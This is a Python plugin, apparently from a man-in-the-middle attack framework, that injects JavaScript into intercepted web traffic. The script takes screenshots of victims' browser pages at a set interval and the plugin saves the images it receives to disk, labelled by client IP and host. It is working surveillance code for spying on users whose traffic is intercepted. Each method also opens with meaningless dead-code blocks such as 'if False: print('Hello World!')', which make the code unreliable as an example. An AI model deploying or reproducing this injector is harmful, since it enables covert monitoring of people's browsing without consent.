import base64
import urllib
import re
from datetime import datetime
from plugins.plugin import Plugin
from plugins.inject import Inject

class ScreenShotter(Inject, Plugin):
    name = 'ScreenShotter'
    optname = 'screen'
    desc = 'Uses HTML5 Canvas to render an accurate screenshot of a clients browser'
    ver = '0.1'

    def initialize(self, options):
        if False:
            return 10
        Inject.initialize(self, options)
        self.interval = options.interval
        self.js_payload = self.get_payload()

    def request(self, request):
        if False:
            while True:
                i = 10
        if 'saveshot' in request.uri:
            request.handle_post_output = True
            client = request.client.getClientIP()
            img_file = '{}-{}-{}.png'.format(client, request.headers['host'], datetime.now().strftime('%Y-%m-%d_%H:%M:%S:%s'))
            try:
                with open('./logs/' + img_file, 'wb') as img:
                    img.write(base64.b64decode(urllib.unquote(request.postData).decode('utf8').split(',')[1]))
                self.clientlog.info('Saved screenshot to {}'.format(img_file), extra=request.clientInfo)
            except Exception as e:
                self.clientlog.error('Error saving screenshot: {}'.format(e), extra=request.clientInfo)

    def get_payload(self):
        if False:
            for i in range(10):
                print('nop')
        return re.sub('SECONDS_GO_HERE', str(self.interval * 1000), open('./core/javascript/screenshot.js', 'rb').read())

    def options(self, options):
        if False:
            print('Hello World!')
        options.add_argument('--interval', dest='interval', type=int, metavar='SECONDS', default=10, help='Interval at which screenshots will be taken (default 10 seconds)')